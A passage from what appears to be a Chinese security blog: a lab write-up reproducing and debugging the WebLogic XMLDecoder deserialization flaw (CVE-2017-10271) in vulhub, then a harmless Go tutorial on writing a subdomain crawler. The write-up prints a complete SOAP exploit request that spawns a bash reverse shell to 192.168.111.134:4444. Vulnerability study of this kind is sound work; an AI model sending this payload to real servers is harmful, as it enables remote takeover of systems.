<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/vulhub/</span>vulhub<span class="regexp">/blob/m</span>aster<span class="regexp">/weblogic/</span>CVE-<span class="number">2017</span>-<span class="number">10271</span></span><br></pre></td></tr></table></figure>

<p>因为要动态调试，需要开启一个远程调试的端口8053，所以将docker-compose.yml文件改动如下</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line"><span class="string">version:</span> <span class="string">'2'</span><span class="string">services:</span>  </span><br><span class="line"><span class="string">weblogic:</span>    <span class="string">image:</span> vulhub/weblogic   </span><br><span class="line"><span class="string">ports:</span>     </span><br><span class="line">- <span class="string">"7001:7001"</span>     </span><br><span class="line">- <span class="string">"8453:8453"</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/02/09/weblogic-xmldecoder-fan-xu-lie-hua-lou-dong-xue-xi/QQ%E6%88%AA%E5%9B%BE20210206141422.png" alt></p>
<h4 id="IDEA远程调试"><a href="#IDEA远程调试" class="headerlink" title="IDEA远程调试"></a>IDEA远程调试</h4><p>,关于Weblogic的远程调试方法可以参考:</p>
<p><a href="https://github.com/Maskhe/javasec/blob/master/IDEA%E8%B0%83%E8%AF%95%E6%8A%80%E5%B7%A72%E2%80%94%E2%80%94%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95.md" target="_blank" rel="noopener">https://github.com/Maskhe/javasec/blob/master/IDEA%E8%B0%83%E8%AF%95%E6%8A%80%E5%B7%A72%E2%80%94%E2%80%94%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95.md</a></p>
<p>使用idea打开拷贝出的项目文件，将项目中的/server/lib和modules这两个文件夹添加到library。</p>
<p>添加后，就会发现里面的.jar和.war的包都可以点开了，并且可以搜索里面的一些类和字符串了。</p>
<p><img src="/2021/02/09/weblogic-xmldecoder-fan-xu-lie-hua-lou-dong-xue-xi/QQ%E6%88%AA%E5%9B%BE20210207180841.png" alt></p>
<p>然后我们在idea中设置remote debug，然后点击右上方的debug，出现如下字样，说明已经配置ok。</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">Connected <span class="keyword">to</span> the target VM, addres<span class="variable">s:</span> <span class="string">'localhost:8453'</span>, transpor<span class="variable">t:</span> <span class="string">'socket'</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/02/09/weblogic-xmldecoder-fan-xu-lie-hua-lou-dong-xue-xi/QQ%E6%88%AA%E5%9B%BE20210207125332.png" alt></p>
<h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>首先我们复现一下漏洞,在response中我们可以看到命令执行的调用栈。</p>
<p>首先我们开一个nc监听。</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nc -lvvp <span class="number">8888</span></span><br></pre></td></tr></table></figure>

<p>然后直接拿vulhub上的poc打:</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/wls-wsat/CoordinatorPortType</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: your-ip:7001</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span>: */*</span><br><span class="line"><span class="attribute">Accept-Language</span>: en</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Type</span>: text/xml</span><br><span class="line"><span class="attribute">Content-Length</span>: 633</span><br><span class="line"></span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"&gt; &lt;soapenv:Header&gt;</span><br><span class="line">&lt;work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"&gt;</span><br><span class="line">&lt;java version="1.4.0" class="java.beans.XMLDecoder"&gt;</span><br><span class="line">&lt;void class="java.lang.ProcessBuilder"&gt;</span><br><span class="line">&lt;array class="java.lang.String" length="3"&gt;</span><br><span class="line">&lt;void index="0"&gt;</span><br><span class="line">&lt;string&gt;/bin/bash&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index="1"&gt;</span><br><span class="line">&lt;string&gt;-c&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index="2"&gt;</span><br><span class="line">&lt;string&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.111.134/4444 0&amp;gt;&amp;amp;1&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;/array&gt;</span><br><span class="line">&lt;void method="start"/&gt;&lt;/void&gt;</span><br><span class="line">&lt;/java&gt;</span><br><span class="line">&lt;/work:WorkContext&gt;</span><br><span class="line">&lt;/soapenv:Header&gt;</span><br><span class="line">&lt;soapenv:Body/&gt;</span><br><span class="line">&lt;/soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure>

<p>反弹shell成功</p>
<p><img src="/2021/02/09/weblogic-xmldecoder-fan-xu-lie-hua-lou-dong-xue-xi/QQ%E6%88%AA%E5%9B%BE20210207143625.png" alt></p>
<p>通过查看response中的xml数据，我们可以在&lt;ns2:frame /&gt;标签中看到调用栈。</p>
<p><img src="/2021/02/09/weblogic-xmldecoder-fan-xu-lie-hua-lou-dong-xue-xi/QQ%E6%88%AA%E5%9B%BE20210207143937.png" alt></p>
<p>其中重要的调用栈有如下一些方法:</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">-</span> <span class="selector-tag">weblogic</span><span class="selector-class">.wsee</span><span class="selector-class">.jaxws</span><span class="selector-class">.workcontext</span><span class="selector-class">.WorkContextServerTube-</span>&gt;<span class="selector-tag">processRequest</span></span><br><span class="line"><span class="selector-tag">-</span> <span class="selector-tag">weblogic</span><span class="selector-class">.wsee</span><span class="selector-class">.jaxws</span><span class="selector-class">.workcontext</span><span class="selector-class">.WorkContextTube-</span>&gt;<span class="selector-tag">readHeaderOld</span></span><br><span class="line"><span class="selector-tag">-</span> <span class="selector-tag">weblogic</span><span class="selector-class">.wsee</span><span class="selector-class">.jaxws</span><span class="selector-class">.workcontext</span><span class="selector-class">.WorkContextServerTube-</span>&gt;<span class="selector-tag">receive</span></span><br><span class="line"><span class="selector-tag">-</span> <span class="selector-tag">weblogic</span><span class="selector-class">.workarea</span><span class="selector-class">.WorkContextMapImpl-</span>&gt;<span class="selector-tag">receiveRequest</span></span><br><span class="line"><span class="selector-tag">-</span> <span class="selector-tag">weblogic</span><span class="selector-class">.workarea</span><span class="selector-class">.WorkContextLocalMap-</span>&gt;<span class="selector-tag">receiveRequest</span></span><br><span class="line"><span class="selector-tag">-</span> <span class="selector-tag">weblogic</span><span class="selector-class">.workarea</span><span class="selector-class">.spi</span><span class="selector-class">.WorkContextEntryImpl-</span>&gt;<span class="selector-tag">readEntry</span></span><br><span class="line"><span class="selector-tag">-</span> <span class="selector-tag">weblogic</span><span class="selector-class">.wsee</span><span class="selector-class">.workarea</span><span class="selector-class">.WorkContextXmlInputAdapter-</span>&gt;<span class="selector-tag">readUTF</span></span><br></pre></td></tr></table></figure>

<p>我们接下来就根据上面复现得到的调用栈进行跟踪调试。</p>
<h3 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h3><p>根据poc找到问题出在<code>wls-wsat</code>，然后找到对应的wls-wsat.war包，打开后点击<code>web.xml</code>查看有哪些接口</p>
<p><img src="/2021/02/09/weblogic-xmldecoder-fan-xu-lie-hua-lou-dong-xue-xi/QQ%E6%88%AA%E5%9B%BE20210206220029.png" alt></p>
<p>然后我们直接跟踪调用栈的第一个processRequest 方法。</p>
<h4 id="weblogic-wsee-jaxws-workcontext-WorkContextServerTube"><a href="#weblogic-wsee-jaxws-workcontext-WorkContextServerTube" class="headerlink" title="weblogic.wsee.jaxws.workcontext.WorkContextServerTube"></a>weblogic.wsee.jaxws.workcontext.WorkContextServerTube</h4><p><img src="/2021/02/09/weblogic-xmldecoder-fan-xu-lie-hua-lou-dong-xue-xi/QQ%E6%88%AA%E5%9B%BE20210207130022.png" alt></p>
<p>   这里的var1是传进来的XML数据。var3是soap头部解析的结果 不为空 于是 跟入readHeaderOld。</p>
<h3 id="weblogic-wsee-jaxws-workcontext-WorkContextTube"><a href="#weblogic-wsee-jaxws-workcontext-WorkContextTube" class="headerlink" title="weblogic.wsee.jaxws.workcontext.WorkContextTube"></a>weblogic.wsee.jaxws.workcontext.WorkContextTube</h3><p><img src="/2021/02/09/weblogic-xmldecoder-fan-xu-lie-hua-lou-dong-xue-xi/QQ%E6%88%AA%E5%9B%BE20210207130400.png" alt></p>
<p>在此方法中实例化了WorkContextXmlInputAdapter类，并且将获取到的XML格式的序列化数据传递到此类的构造方法中，之后跟进receive()</p>
<h3 id="weblogic-wsee-jaxws-workcontext-WorkContextServerTube-1"><a href="#weblogic-wsee-jaxws-workcontext-WorkContextServerTube-1" class="headerlink" title="weblogic.wsee.jaxws.workcontext.WorkContextServerTube"></a>weblogic.wsee.jaxws.workcontext.WorkContextServerTube</h3><p>var2获取一个WorkContextMapImpl实例，然后调用receiveRequest方法将var1值传入。</p>
<p><img src="/2021/02/09/weblogic-xmldecoder-fan-xu-lie-hua-lou-dong-xue-xi/QQ%E6%88%AA%E5%9B%BE20210207181022.png" alt></p>
<p>继续跟进receiveRequest()</p>
<h3 id="weblogic-workarea-WorkContextMapImpl"><a href="#weblogic-workarea-WorkContextMapImpl" class="headerlink" title="weblogic.workarea.WorkContextMapImpl"></a>weblogic.workarea.WorkContextMapImpl</h3><p><img src="/2021/02/09/weblogic-xmldecoder-fan-xu-lie-hua-lou-dong-xue-xi/QQ%E6%88%AA%E5%9B%BE20210207181140.png" alt></p>
<p>将var1传到了receiveRequest()方法中，继续跟进</p>
<h3 id="weblogic-workarea-WorkContextLocalMap"><a href="#weblogic-workarea-WorkContextLocalMap" class="headerlink" title="weblogic.workarea.WorkContextLocalMap"></a>weblogic.workarea.WorkContextLocalMap</h3><p><img src="/2021/02/09/weblogic-xmldecoder-fan-xu-lie-hua-lou-dong-xue-xi/QQ%E6%88%AA%E5%9B%BE20210207131058.png" alt></p>
<p><code>WorkContextEntryImpl.readEntry(var1);</code>对传进来的数据进行处理，具体的代码好像看不太懂，但是跟进！readEntry()！</p>
<h3 id="weblogic-workarea-spi-WorkContextEntryImpl"><a href="#weblogic-workarea-spi-WorkContextEntryImpl" class="headerlink" title="weblogic.workarea.spi.WorkContextEntryImpl"></a>weblogic.workarea.spi.WorkContextEntryImpl</h3><p><img src="/2021/02/09/weblogic-xmldecoder-fan-xu-lie-hua-lou-dong-xue-xi/QQ%E6%88%AA%E5%9B%BE20210207131154.png" alt></p>
<p>继续跟进readUTF()：</p>
<h3 id="weblogic-wsee-workarea-WorkContextXmlInputAdapter"><a href="#weblogic-wsee-workarea-WorkContextXmlInputAdapter" class="headerlink" title="weblogic.wsee.workarea.WorkContextXmlInputAdapter"></a>weblogic.wsee.workarea.WorkContextXmlInputAdapter</h3><p><img src="/2021/02/09/weblogic-xmldecoder-fan-xu-lie-hua-lou-dong-xue-xi/QQ%E6%88%AA%E5%9B%BE20210207131435.png" alt></p>
<p>在这里就执行了this.xmlDecoder.readObject()，对XMLDecoder对象进行了反序列化，导致RCE。</p>
<h4 id="调用栈总结"><a href="#调用栈总结" class="headerlink" title="调用栈总结"></a>调用栈总结</h4><p><img src="/2021/02/09/weblogic-xmldecoder-fan-xu-lie-hua-lou-dong-xue-xi/QQ%E6%88%AA%E5%9B%BE20210207183630.png" alt></p>
<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://hu3sky.github.io/2019/10/16/weblogic/#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90" target="_blank" rel="noopener">https://hu3sky.github.io/2019/10/16/weblogic/#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90</a></p>
<p><a href="http://www.wxylyw.com/2018/11/03/WebLogic-XMLDecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">http://www.wxylyw.com/2018/11/03/WebLogic-XMLDecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></p>
<p><a href="https://www.jianshu.com/p/5493f63fd7a0" target="_blank" rel="noopener">https://www.jianshu.com/p/5493f63fd7a0</a></p>
<p><a href="https://github.com/Maskhe/javasec/blob/master/Weblogic%E4%B9%8BXMLDecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%961%EF%BC%88CVE-2017-3506).md" target="_blank" rel="noopener">https://github.com/Maskhe/javasec/blob/master/Weblogic%E4%B9%8BXMLDecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%961%EF%BC%88CVE-2017-3506).md</a></p>
<p><a href="https://vulhub.org/#/environments/weblogic/CVE-2017-10271/" target="_blank" rel="noopener">https://vulhub.org/#/environments/weblogic/CVE-2017-10271/</a></p>
]]></content>
  </entry>
  <entry>
    <title>golang学习--编写爬虫</title>
    <url>/2021/04/03/golang-xue-xi-bian-xie-pa-chong/</url>
    <content><![CDATA[<h2 id="golang–从零学习编写一个爬虫"><a href="#golang–从零学习编写一个爬虫" class="headerlink" title="golang–从零学习编写一个爬虫"></a>golang–从零学习编写一个爬虫</h2><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>​    学习了一段时间的go，觉得自己应该实际上手写一些东西，之前一直使用在三只师傅python写的jsfinder,就想着用go写一个类似jsfinder的爬虫。</p>
<h4 id="steps1"><a href="#steps1" class="headerlink" title="steps1"></a>steps1</h4><p>首先实现简单访问并读取页面内容的功能，主要使用net/http模块。</p>
<figure class="highlight roboconf"><table><tr><td class="code"><pre><span class="line">func main()&#123;</span><br><span class="line">	<span class="attribute">resp,err</span>:=http<span class="variable">.Get</span>("https://www<span class="variable">.lenovo</span><span class="variable">.com</span><span class="variable">.cn</span>")</span><br><span class="line">	if err!=nil&#123;</span><br><span class="line">		log<span class="variable">.Fatal</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line">	if resp<span class="variable">.StatusCode</span>!=200 &#123;</span><br><span class="line">		log<span class="variable">.Fatal</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line">	doc,err:=ioutil<span class="variable">.ReadAll</span>(resp<span class="variable">.Body</span>)</span><br><span class="line">	resp<span class="variable">.Body</span><span class="variable">.Close</span>()</span><br><span class="line">	fmt<span class="variable">.Printf</span>("%s",doc)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>ioutil.ReadAll</strong> 是一个常用的数据读取方法，经常用来读取http请求的response数据，或者读取文件数据。</p>
<p><img src="/2021/04/03/golang-xue-xi-bian-xie-pa-chong/QQ%E6%88%AA%E5%9B%BE20210323110459.png" alt></p>
<p>可以看到正常输出了页面内容。</p>
<h4 id="step2"><a href="#step2" class="headerlink" title="step2"></a>step2</h4><p>​        第二步我们需要对页面进行解析，并提取页面中的js链接。我们可以使用go自带的regexp来进行正则匹配(类似python),这里我使用很方便的第三方包goquery读取HTML代码。</p>
<p>​    goquery是一个使用go语言写成的HTML解析库，可以让你像jQuery那样的方式来操作DOM文档，使用起来非常的简便。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">"fmt"</span></span><br><span class="line">	<span class="string">"net/http"</span></span><br><span class="line"></span><br><span class="line">	<span class="string">"github.com/PuerkitoBio/goquery"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	resp,err:=http.Get(<span class="string">"https://www.lenovo.com.cn"</span>)</span><br><span class="line">	<span class="keyword">if</span> err!=<span class="literal">nil</span>&#123;</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> resp.StatusCode!=<span class="number">200</span> &#123;</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	doc,err:=goquery.NewDocumentFromReader(resp.Body) </span><br><span class="line">	<span class="comment">// NewDocumentFromReader：读取字符串的HTML代码</span></span><br><span class="line">	<span class="keyword">if</span> err!=<span class="literal">nil</span>&#123;</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	resp.Body.Close()</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//Find函数是查找HTML里面所有符合要求的标签。</span></span><br><span class="line">	doc.Find(<span class="string">"a"</span>).Each(<span class="function"><span class="keyword">func</span><span class="params">(i <span class="keyword">int</span>, s *goquery.Selection)</span></span> &#123;</span><br><span class="line">		href, ex := s.Attr(<span class="string">"href"</span>)</span><br><span class="line">		<span class="comment">// 使用Attr获取数据所在HTML代码的href属性</span></span><br><span class="line">		<span class="keyword">if</span> ex &#123;</span><br><span class="line">			fmt.Println(href)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2021/04/03/golang-xue-xi-bian-xie-pa-chong/QQ%E6%88%AA%E5%9B%BE20210323112554.png" alt></p>
<p>可以看到这里成功爬取到了页面的js链接。</p>
<p>当然这里还有一个更好用的第三方包：<strong>github.com/jackdanger/collectlinks</strong> 可以提取网页中所有的链接。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line">	<span class="string">"github.com/jackdanger/collectlinks"</span></span><br><span class="line"></span><br><span class="line">	<span class="string">"net/http"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	resp, err := http.Get(<span class="string">"https://www.lenovo.com.cn"</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> resp.StatusCode != <span class="number">200</span> &#123;</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	links := collectlinks.All(resp.Body)</span><br><span class="line">	<span class="keyword">for</span> _, link := <span class="keyword">range</span> links &#123;</span><br><span class="line">		fmt.Println(link)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	resp.Body.Close()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用下来感觉要比自己写规则爬的全很多。</p>
<p><img src="/2021/04/03/golang-xue-xi-bian-xie-pa-chong/QQ%E6%88%AA%E5%9B%BE20210327163740.png" alt></p>
<h4 id="step3"><a href="#step3" class="headerlink" title="step3"></a>step3</h4><p>​    第三步我们要对获取到的链接进行处理，首先转化为绝对链接，然后提取出其中的子域名经过去重之后存入新的数组队列中。</p>
<p>我们这里封装三个函数，分别用来转化绝对路径、判断子域名和去重:</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">urlparse</span><span class="params">(href, base <span class="keyword">string</span>)</span> <span class="title">string</span></span> &#123;</span><br><span class="line">	uri, err := url.Parse(href)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">" "</span></span><br><span class="line">	&#125;</span><br><span class="line">	baseUrl, err := url.Parse(base)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">" "</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> baseUrl.ResolveReference(uri).String()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>issubdomain</strong></p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">isSubdomain</span><span class="params">(rawURL, domain <span class="keyword">string</span>)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">	reg,err:=regexp.MatchString(domain,rawURL)</span><br><span class="line">	<span class="keyword">if</span> err!=<span class="literal">nil</span>&#123;</span><br><span class="line">		log.Println(err)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> reg&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>remove</strong></p>
<p>去重这里参考了网上数组切片去重的方式。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">remove</span><span class="params">(languages []<span class="keyword">string</span>)</span> []<span class="title">string</span></span> &#123;</span><br><span class="line">	result := <span class="built_in">make</span>([]<span class="keyword">string</span>, <span class="number">0</span>, <span class="built_in">len</span>(languages))</span><br><span class="line">	temp := <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">struct</span>&#123;&#125;&#123;&#125;</span><br><span class="line">	<span class="keyword">for</span> _, item := <span class="keyword">range</span> languages &#123;</span><br><span class="line">		<span class="keyword">if</span> _, ok := temp[item]; !ok &#123;</span><br><span class="line">			temp[item] = <span class="keyword">struct</span>&#123;&#125;&#123;&#125;</span><br><span class="line">			result = <span class="built_in">append</span>(result, item)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> result</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    然后在主函数中再定义一个sublists数组，然后对收集到的js链接调用上述函数进行处理后，将结果保存到数组中输出。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">"fmt"</span></span><br><span class="line">	<span class="string">"log"</span></span><br><span class="line">	<span class="string">"net/url"</span></span><br><span class="line">	<span class="string">"regexp"</span></span><br><span class="line"></span><br><span class="line">	<span class="string">"github.com/jackdanger/collectlinks"</span></span><br><span class="line"></span><br><span class="line">	<span class="string">"net/http"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	sublists := <span class="built_in">make</span>([]<span class="keyword">string</span>, <span class="number">0</span>)</span><br><span class="line">	first:=<span class="string">"https://www.lenovo.com.cn"</span></span><br><span class="line">	resp, err := http.Get(first)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Print(err)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> resp.StatusCode != <span class="number">200</span> &#123;</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	links := collectlinks.All(resp.Body)</span><br><span class="line">	resp.Body.Close()</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> _, link := <span class="keyword">range</span> links &#123;</span><br><span class="line">		urls,err:=url.Parse(link)</span><br><span class="line">		<span class="keyword">if</span> err!=<span class="literal">nil</span> &#123;</span><br><span class="line">			log.Println(err)</span><br><span class="line">			<span class="keyword">continue</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> isSubdomain(urls.Host,<span class="string">"lenovo.com"</span>)&#123;</span><br><span class="line">			sublists=<span class="built_in">append</span>(sublists,<span class="string">"http://"</span>+urls.Host)</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		sublists=remove(sublists)</span><br><span class="line">		<span class="keyword">for</span> _,sublist:=<span class="keyword">range</span> sublists&#123;</span><br><span class="line">			fmt.Println(sublist)</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">isSubdomain</span><span class="params">(rawURL, domain <span class="keyword">string</span>)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">	reg,err:=regexp.MatchString(domain,rawURL)</span><br><span class="line">	<span class="keyword">if</span> err!=<span class="literal">nil</span>&#123;</span><br><span class="line">		log.Println(err)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> reg&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">remove</span><span class="params">(languages []<span class="keyword">string</span>)</span> []<span class="title">string</span></span> &#123;</span><br><span class="line">	result := <span class="built_in">make</span>([]<span class="keyword">string</span>, <span class="number">0</span>, <span class="built_in">len</span>(languages))</span><br><span class="line">	temp := <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">struct</span>&#123;&#125;&#123;&#125;</span><br><span class="line">	<span class="keyword">for</span> _, item := <span class="keyword">range</span> languages &#123;</span><br><span class="line">		<span class="keyword">if</span> _, ok := temp[item]; !ok &#123;</span><br><span class="line">			temp[item] = <span class="keyword">struct</span>&#123;&#125;&#123;&#125;</span><br><span class="line">			result = <span class="built_in">append</span>(result, item)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> result</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2021/04/03/golang-xue-xi-bian-xie-pa-chong/QQ%E6%88%AA%E5%9B%BE20210327191705.png" alt></p>
<h4 id="step4"><a href="#step4" class="headerlink" title="step4"></a>step4</h4><p>第四步我们实现循环爬取的功能，首先我们将之前的主函数封装为crawl爬虫函数:</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">func crawl(uri string) []string &#123;</span><br><span class="line">	fmt.Println(uri)</span><br><span class="line">	sublists := make([]string, 0)</span><br><span class="line">	resp, <span class="keyword">err</span> := http.<span class="built_in">Get</span>(uri)</span><br><span class="line">	<span class="keyword">if</span> <span class="keyword">err</span> != nil &#123;</span><br><span class="line">		<span class="keyword">log</span>.<span class="keyword">Print</span>(<span class="keyword">err</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> resp.StatusCode != 200 &#123;</span><br><span class="line">		<span class="keyword">log</span>.<span class="keyword">Print</span>(<span class="keyword">err</span>)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	links := collectlinks.All(resp.Body)</span><br><span class="line">	resp.Body.<span class="keyword">Close</span>()</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> _, link := <span class="keyword">range</span> links &#123;</span><br><span class="line">		urls,<span class="keyword">err</span>:=url.<span class="keyword">Parse</span>(link)</span><br><span class="line">		<span class="keyword">if</span> <span class="keyword">err</span>!=nil &#123;</span><br><span class="line">			<span class="keyword">log</span>.Println(<span class="keyword">err</span>)</span><br><span class="line">			<span class="keyword">continue</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> isSubdomain(urls.Host,<span class="string">"lenovo.com"</span>)&#123;</span><br><span class="line">			sublists=<span class="keyword">append</span>(sublists,<span class="string">"http://"</span>+urls.Host)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	sublists=remove(sublists)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> sublists</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后在主函数中进行循环爬取：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">func</span> <span class="selector-tag">main</span>() &#123;</span><br><span class="line">	<span class="attribute">sublists</span>:=<span class="built_in">make</span>([]string,<span class="number">0</span>)</span><br><span class="line">	seen:=<span class="built_in">make</span>(map[string]bool)</span><br><span class="line">	sublists = <span class="built_in">append</span>(sublists,<span class="string">"http://www.lenovo.com.cn"</span>)</span><br><span class="line">	for <span class="built_in">len</span>(sublists) &gt; <span class="number">0</span> &#123;</span><br><span class="line">		items := sublists</span><br><span class="line">		sublists = nil</span><br><span class="line">		for _, item := range items &#123;</span><br><span class="line">			if !seen[item] &#123;</span><br><span class="line">				seen[item] = true</span><br><span class="line">				sublists = <span class="built_in">append</span>(sublists, crawl(item)...)</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里爬了下jd，效果还是挺明显的:</p>
<p><img src="/2021/04/03/golang-xue-xi-bian-xie-pa-chong/QQ%E6%88%AA%E5%9B%BE20210327195637.png" alt></p>
<p>​    这里在爬取过程会遇到一个异常:dial tcp: lookup help.en.jd.com: no such host,</p>
<p>意思大概是获取到的域名不能解析，所以我们需要使用defer+recover来捕获异常。防止程序直接退出。</p>
